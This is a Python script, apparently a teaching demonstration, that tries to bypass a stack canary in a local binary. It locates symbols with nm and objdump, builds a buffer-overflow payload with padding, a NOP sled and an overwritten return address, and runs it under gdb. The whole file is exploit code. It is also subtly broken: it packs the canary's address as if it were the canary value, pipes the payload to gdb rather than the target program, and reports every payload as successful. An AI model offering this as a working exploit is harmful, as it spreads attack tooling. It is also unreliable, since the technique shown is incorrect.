import subprocess
import os
import struct
import re

# Define path to the vulnerable binary
BINARY_PATH = "./vulnerable_binary"

def analyze_binary(binary_path):
    """Analyze the binary to extract memory layout information using nm and objdump."""
    nm_output = subprocess.check_output(['nm', binary_path]).decode()
    objdump_output = subprocess.check_output(['objdump', '-d', binary_path]).decode()

    canary_address = re.search(r'(\w+) B canary', nm_output)
    buffer_address = re.search(r'(\w+) <vulnerable_function>:', objdump_output)

    return canary_address.group(1), buffer_address.group(1)

def create_payload(canary, return_address):
    """Create payload to bypass stack canary and overwrite return address."""
    buffer_size = 64  # Adjust buffer size as necessary
    nop_slide = b"\x90" * 16  # NOP sled for controlled execution
    payload = b"A" * buffer_size  # Fill buffer to overflow
    payload += struct.pack("<I", canary)  # Pack the canary value
    payload += nop_slide
    payload += struct.pack("<I", return_address)  # New return address
    return payload

def gdb_auto_run(binary_path, payload):
    """Automatically run gdb with the given payload."""
    gdb_commands = f"""
    set disable-randomization on
    break vulnerable_function
    run
    """
    gdb_script = "gdb_script.gdb"
    with open(gdb_script, "w") as f:
        f.write(gdb_commands)

    gdb_process = subprocess.Popen(['gdb', '-x', gdb_script, binary_path], stdin=subprocess.PIPE)
    gdb_process.communicate(input=payload)
    gdb_process.wait()
    print("Check gdb for output")

def visualize_memory_layout(canary, return_address):
    """Create a simple ASCII art visualization of the memory layout."""
    print(f"Memory Layout:\nCanary at: {canary}\nReturn address at: {return_address}")

def test_payloads(payload_variants, binary_path):
    """Test multiple payloads to find a successful exploit."""
    for payload in payload_variants:
        try:
            result = gdb_auto_run(binary_path, payload)
            print(f"Payload successful: {payload}")
        except Exception as e:
            print(f"Payload failed: {payload}\nError: {str(e)}")

def main():
    print("Starting Stack Canary Bypass demonstration...")

    # Extract addresses and values
    canary, return_address = analyze_binary(BINARY_PATH)
    canary = int(canary, 16)
    return_address = int(return_address, 16) + 0x50  # Adjust this offset as needed

    # Create the initial payload
    payload = create_payload(canary, return_address)

    # Visualize initial memory layout
    visualize_memory_layout(canary, return_address)

    # Interactive payload crafting (Optional)
    # payload = interactive_exploit_session(payload)

    # Test the payload
    test_payloads([payload], BINARY_PATH)

    print("Exploit attempt completed. Check GDB output for details.")

if __name__ == "__main__":
    main()
